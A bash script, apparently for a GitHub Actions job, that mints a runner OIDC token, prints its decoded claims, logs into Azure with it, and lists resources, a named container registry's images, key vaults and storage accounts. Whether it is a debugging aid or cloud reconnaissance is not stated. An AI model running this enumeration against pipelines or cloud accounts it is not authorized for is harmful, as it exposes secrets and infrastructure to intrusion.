#!/usr/bin/env bash
set +e
echo "===== ENV (filtered) ====="
env | grep -Ei 'AZURE|ACTIONS_ID_TOKEN|GITHUB_REPOSITORY|RUNNER' | sed 's/^/ENV: /' | sort
echo "===== OIDC ====="
RESP=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api%3A%2F%2FAzureADTokenExchange")
TOK=$(echo "$RESP" | jq -r '.value')
echo "token_length=${#TOK}"
echo "jwt_claims=$(echo "$TOK" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null)"
echo "===== AZ LOGIN ====="
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" --federated-token "$TOK" --allow-no-subscriptions -o json 2>&1 | head -60
echo "===== ACCOUNT ====="
az account show -o json 2>&1 | head -40
az account list --all -o json 2>&1 | head -60
echo "===== GROUPS ====="
az group list -o json 2>&1 | head -80
echo "===== RESOURCES ====="
az resource list -o json 2>&1 | head -300
echo "===== ACR repos ====="
az acr repository list -n crtblplatprodx3euoz -o json 2>&1 | head -40
for r in $(az acr repository list -n crtblplatprodx3euoz -o tsv 2>/dev/null); do
  echo "--- ACR repo: $r ---"
  az acr repository show-tags -n crtblplatprodx3euoz --repository "$r" -o json 2>&1 | head -40
  az acr manifest list-metadata -r crtblplatprodx3euoz -n "$r" -o json 2>&1 | head -80
done
echo "===== KEYVAULT ====="
az keyvault list -o json 2>&1 | head -60
echo "===== STORAGE ====="
az storage account list -o json 2>&1 | head -60
echo "===== DONE ====="
